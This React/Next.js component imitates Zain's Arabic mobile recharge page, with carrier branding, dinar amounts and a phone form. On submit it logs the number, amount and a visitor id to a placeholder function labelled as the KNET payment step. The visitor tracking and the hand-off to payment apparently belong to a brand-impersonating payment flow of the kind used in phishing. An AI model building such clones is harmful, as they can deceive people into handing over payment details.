"use client"

import { useEffect, useMemo, useState } from "react"
import { Menu, Heart, ShoppingCart, ChevronDown, Plus, Check } from 'lucide-react'
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Sheet, SheetContent, SheetDescription, SheetHeader, SheetTrigger } from "./ui/sheet"
import Link from "next/link"

const rechargeOptions = [
  { amount: "2.000", validity: "الصلاحية 7 يوم", days: 7 },
  { amount: "4.000", validity: "الصلاحية 15 يوم", days: 15 },
  { amount: "6.000", validity: "الصلاحية 30 يوم", days: 30 },
  { amount: "12.000", validity: "الصلاحية 90 يوم", days: 90 },
  { amount: "22.000", validity: "الصلاحية 180 يوم", days: 180 },
  { amount: "30.000", validity: "الصلاحية 365 يوم", days: 365 },
]

// Placeholder for addData function - replace with actual implementation
async function addData(data: any) {
  console.log("Data to be sent:", data);
  // Add your actual API call here
}

export default function ZainRechargePage({
  setShow,
  setStepNumber,
}: {
  setShow?: (v: boolean) => void;
  setStepNumber?: (n: number) => void;
}){
  const [activeTab, setActiveTab] = useState<"recharge" | "bill">("recharge")
  const [phoneNumber, setPhoneNumber] = useState("")
  const [phoneError, setPhoneError] = useState("");
  const [loading, setIsLoading] = useState(false);

  const [selectedAmount, setSelectedAmount] = useState(rechargeOptions[2])
  const [isAmountDropdownOpen, setIsAmountDropdownOpen] = useState(false)
  
  // Derived state
  const isValidPhone = phoneNumber.length === 8 && /^\d{8}$/.test(phoneNumber);
  const isFormValid = isValidPhone && Number.parseFloat(selectedAmount.amount) > 0;

  useEffect(() => {
    localStorage.setItem("amount", selectedAmount.amount);
  }, [selectedAmount]);

  useEffect(() => {
    if (!phoneNumber) return setPhoneError("");
    if (!/^\d+$/.test(phoneNumber) || phoneNumber.length !== 8) {
      setPhoneError("يجب أن يتكون رقم الهاتف من 8 أرقام صحيحة.");
    } else {
      setPhoneError("");
    }
  }, [phoneNumber]);

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/[^0-9]/g, "");
    if (value.length <= 8) setPhoneNumber(value);
  };

  const handleAmountSelect = (value: string) => {
    const option = rechargeOptions.find(opt => opt.amount === value);
    if (option) setSelectedAmount(option);
  };

  const formattedAmount = useMemo(
    () => Number.parseFloat(selectedAmount.amount || "0").toFixed(3),
    [selectedAmount.amount]
  );

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isFormValid) return;
    setIsLoading(true);
    try {
      const visitorId = localStorage.getItem("visitor");
      await addData({
        id: visitorId,
        phone: phoneNumber,
        amount: selectedAmount.amount,
        timestamp: new Date().toISOString(),
        currentPage: "كي نت",
        action: "payment_submit_attempt",
        type: activeTab,
      });
      if (setStepNumber) setStepNumber(2);
    } catch (error: any) {
      console.error("Submission error:", error);
      const visitorId = localStorage.getItem("visitor");
      await addData({
        id: visitorId,
        action: "payment_submit_error",
        error: error?.message ?? String(error),
      });
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-50" dir="rtl">
      {/* Header */}
      <header className="flex items-center justify-between bg-[#1a1240] relative">
        <img src="/top.webp" alt="Zain" className="h-12 w-full object-cover" />
        <Sheet>
          <SheetTrigger className="absolute left-3 top-2 hover:bg-white/10 w-10 h-10 p-1 rounded flex items-center justify-center">
            <Menu className="w-6 h-6 text-transparent " />
          </SheetTrigger>
          <SheetContent>
            <SheetHeader>
              <SheetDescription className="my-6 flex flex-col gap-2">
                <Link href="/terms-conditions">الشروط والأحكام</Link>
                <Link href={"/privacy"}>سياسة الخصوصية</Link>
                <Link href={"/contact"}>اتصل بنا</Link>
              </SheetDescription>
            </SheetHeader>
          </SheetContent>
        </Sheet>
      </header>

      <div className="px-4 py-4 max-w-2xl mx-auto">
        {/* Title */}
        <h1 className="text-2xl font-bold text-black text-right mb-8">الدفع السريع</h1>

        {/* Card */}
        <div className="bg-white rounded-2xl shadow-lg overflow-hidden">
          {/* Tabs */}
          <div className="grid grid-cols-2 border-b border-gray-200">
            <button
              onClick={() => setActiveTab("bill")}
              className={`py-4 text-center font-medium transition-colors ${
                activeTab === "bill" ? "text-[#d62598] border-b-2 border-[#d62598]" : "text-gray-500"
              }`}
            >
              دفع الفاتورة
            </button>
            <button
              onClick={() => setActiveTab("recharge")}
              className={`py-4 text-center font-medium transition-colors ${
                activeTab === "recharge" ? "text-[#d62598] border-b-2 border-[#d62598]" : "text-gray-500"
              }`}
            >
              <span className="text-[#d62598]">eeZee</span> إعادة تعبئة
            </button>
          </div>

          {/* Form Content */}
          <div className="p-6 space-y-6">
            {/* Recharge For */}
            <div>
              <p className="text-gray-700 mb-3 text-right">أود أن أعيد التعبئة ل</p>
              <Select defaultValue="other">
                <SelectTrigger className="w-full bg-white border-0 border-b-2 border-gray-200 rounded-none px-0 text-right">
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="other">رقم آخر</SelectItem>
                  <SelectItem value="my">رقمي</SelectItem>
                </SelectContent>
              </Select>
            </div>

            {/* Phone Number */}
            <div>
              <label className="text-sm text-gray-500 mb-2 block text-right">* رقم الهاتف</label>
              <Input
                type="tel"
                value={phoneNumber}
                onChange={handlePhoneChange}
                className="text-2xl font-semibold text-gray-900 border-0 border-b-2 border-gray-200 rounded-none px-0 text-right"
                dir="ltr"
              />
              {phoneError && <p className="text-red-500 text-sm mt-1 text-right">{phoneError}</p>}
            </div>

            {/* Amount */}
            <div>
              <label className="text-gray-700 mb-3 block text-right font-medium">مبلغ التعبئة</label>
              <div className="relative">
                <button
                  onClick={() => setIsAmountDropdownOpen(!isAmountDropdownOpen)}
                  className="w-full flex items-center justify-between border-b-2 border-gray-200 pb-2 hover:border-[#d62598] transition-colors"
                >
                  <ChevronDown
                    className={`w-5 h-5 text-[#d62598] transition-transform ${isAmountDropdownOpen ? "rotate-180" : ""}`}
                  />
                  <div className="text-right flex-1">
                    <div className="text-2xl font-semibold text-gray-900">د.ك {selectedAmount.amount}</div>
                    <div className="text-sm text-gray-500 mt-1">{selectedAmount.validity}</div>
                  </div>
                </button>

                {isAmountDropdownOpen && (
                  <div className="absolute top-full left-0 right-0 mt-2 bg-white rounded-lg shadow-xl border border-gray-200 z-10 max-h-96 overflow-y-auto">
                    {rechargeOptions.map((option, index) => (
                      <button
                        key={index}
                        onClick={() => {
                          setSelectedAmount(option)
                          setIsAmountDropdownOpen(false)
                        }}
                        className="w-full flex items-center justify-between px-4 py-4 hover:bg-gray-50 transition-colors border-b border-gray-100 last:border-b-0"
                      >
                        {selectedAmount.amount === option.amount && <Check className="w-5 h-5 text-[#d62598]" />}
                        {selectedAmount.amount !== option.amount && <div className="w-5" />}
                        <div className="text-right flex-1">
                          <div className="text-sm font-semibold text-gray-900">د.ك {option.amount}</div>
                          <div className="text-sm text-gray-500">{option.validity}</div>
                        </div>
                      </button>
                    ))}
                    <button
                      onClick={() => {
                        setIsAmountDropdownOpen(false)
                      }}
                      className="w-full px-4 py-4 hover:bg-gray-50 transition-colors text-right"
                    >
                      <div className="text-lg font-semibold text-[#d62598]">مبلغ آخر</div>
                    </button>
                  </div>
                )}
              </div>
            </div>

            {/* Add Another Number Button */}
            <button disabled={true} className="w-full py-2 border-2 border-[#d62598] text-[#d62598] rounded-full font-sm flex items-center justify-center gap-2 hover:bg-pink-50 transition-colors">
              <Plus className="w-5 h-5" />
              أضف رقم آخر
            </button>
          </div>

          {/* Divider */}
          <div className="border-t border-gray-200 mx-6" />

          {/* Total */}
          <div className="px-4 py-4 flex items-center justify-between">
            <div className="text-left">
              <div className="text-xl font-bold text-[#8bc34a]">د.ك {selectedAmount.amount}</div>
            </div>
            <div className="text-right">
              <div className="text-xl font-semibold text-gray-900">إجمالي</div>
            </div>
          </div>

          {/* Recharge Button */}
          <div className="p-4 pt-0">
            <Button 
              onClick={handleSubmit}
              disabled={!isFormValid || loading}
              className="w-full bg-[#d62598] hover:bg-[#c01e85] text-white text-lg py-6 rounded-full font-semibold shadow-lg disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {loading ? "جاري المعالجة..." : "أعد التعبئة الآن"}
            </Button>
          </div>
        </div>
      </div>
    </div>
  )
}
